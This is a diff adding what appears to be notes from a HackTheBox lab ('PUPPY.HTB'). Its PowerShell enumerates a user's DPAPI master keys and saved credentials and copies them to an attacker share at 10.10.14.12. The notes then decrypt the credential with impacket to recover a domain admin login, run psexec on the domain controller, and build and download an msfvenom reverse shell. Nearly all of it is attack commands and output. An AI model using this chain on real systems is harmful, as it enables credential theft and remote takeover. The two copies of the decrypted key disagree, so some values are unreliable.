@@ -1,0 +1,78 @@
+
+$username = "steph.cooper"
+$userPath = "C:\Users\$username"
+
+$dpapiPath = "$userPath\AppData\Roaming\Microsoft\Protect"
+$credPath = "$userPath\AppData\Roaming\Microsoft\Credentials"
+
+--
+Write-Host "Listing files in DPAPI Protect folder (including hidden/system):"
+if (Test-Path $dpapiPath) {
+    Get-ChildItem -Path $dpapiPath -File -Recurse -Force | ForEach-Object {
+        Write-Host $_.FullName
+    }
+} else {
+    Write-Host "DPAPI Protect folder does not exist: $dpapiPath"
+}
+
+Write-Host "`nListing files in Credentials folder (including hidden/system):"
+if (Test-Path $credPath) {
+    Get-ChildItem -Path $credPath -File -Recurse -Force | ForEach-Object {
+        Write-Host $_.FullName
+    }
+} else {
+    Write-Host "Credentials folder does not exist: $credPath"
+}
+
+--
+
+#-----  .\enum_dpapi5.ps1
+Listing files in DPAPI Protect folder (including hidden/system):
+  C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\CREDHIST
+  C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\SYNCHIST
+  C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
+  C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\Preferred
+
+Listing files in Credentials folder (including hidden/system):
+  C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
+
+#----- copy-item C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 \\10.10.14.12\share\masterkey_blob
+#-----  copy-item C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 \\10.10.14.12\share\credential_blob
+
+
+#----- impacket-dpapi masterkey -file masterkey_blob -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
+Flags       :        0 (0)
+Policy      : 4ccf1275 (1288639093)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b74452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
+
+#----- impacket-dpapi credential -file credential_blob -key 0xd9a57077149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[CREDENTIAL]
+LastWritten : 2025-03-08 15:54:29
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:target=PUPPY.HTB
+Description :
+Unknown     :
+Username    : steph.cooper_adm
+Unknown     : ***!
+
+
+
+#----- impacket-psexec steph.cooper_adm@dc.puppy.htb 
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=443 -f exe EXITFUNC=thread -o shell.exe
+powershell -c "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.14.12/shell.exe\", 'C:\Windows\Tasks\s.exe')"
